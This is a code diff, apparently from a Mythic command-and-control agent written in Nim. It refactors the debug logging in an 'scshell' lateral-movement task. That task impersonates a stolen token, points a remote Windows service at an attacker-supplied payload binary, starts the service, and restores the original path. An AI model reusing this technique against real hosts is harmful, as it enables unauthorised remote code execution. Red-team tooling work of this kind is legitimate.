@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import std/[json, strformat]
 import ../tasks/token_manager
 
@@ -48,8 +48,6 @@ when defined(windows):
 
 proc scshell*(taskId: string, params: JsonNode): JsonNode =
   ## Execute a service on a target host using a specified payload binary
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       # Parse parameters
@@ -57,15 +55,13 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       let service = params["service"].getStr()
       let payload = params["payload"].getStr()
       
-      if cfg.debug:
-        echo &"[DEBUG] Scshell: Target={target}, Service={service}, Payload={payload}"
+      debug &"[DEBUG] Scshell: Target={target}, Service={service}, Payload={payload}"
       
       # Impersonate if token is set
       let tokenHandle = getTokenHandle()
       if tokenHandle != 0:
         if ImpersonateLoggedOnUser(HANDLE(tokenHandle)) != 0:
-          if cfg.debug:
-            echo "[DEBUG] Scshell: Impersonation successful"
+          debug "[DEBUG] Scshell: Impersonation successful"
       
       # Convert strings to wide strings
       var targetWide = newWideCString(target)
@@ -108,8 +104,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       if qscPtr.lpBinaryPathName != nil:
         origPath = $qscPtr.lpBinaryPathName
       
-      if cfg.debug:
-        echo &"[DEBUG] Scshell: Original path: {origPath}"
+      debug &"[DEBUG] Scshell: Original path: {origPath}"
       
       # Change service config to use payload
       if ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
@@ -119,8 +114,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         discard CloseServiceHandle(scm)
         return mythicError(taskId, &"ChangeServiceConfigW (set payload) failed: {err}")
       
-      if cfg.debug:
-        echo "[DEBUG] Scshell: Service configuration changed, starting service..."
+      debug "[DEBUG] Scshell: Service configuration changed, starting service..."
       
       # Start service
       if StartServiceW(svc, 0, nil) == 0:
@@ -140,8 +134,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         discard CloseServiceHandle(scm)
         return mythicError(taskId, &"ChangeServiceConfigW (restore) failed: {err}")
       
-      if cfg.debug:
-        echo "[DEBUG] Scshell: Service configuration restored"
+      debug "[DEBUG] Scshell: Service configuration restored"
       
       # Clean up
       discard CloseServiceHandle(svc)
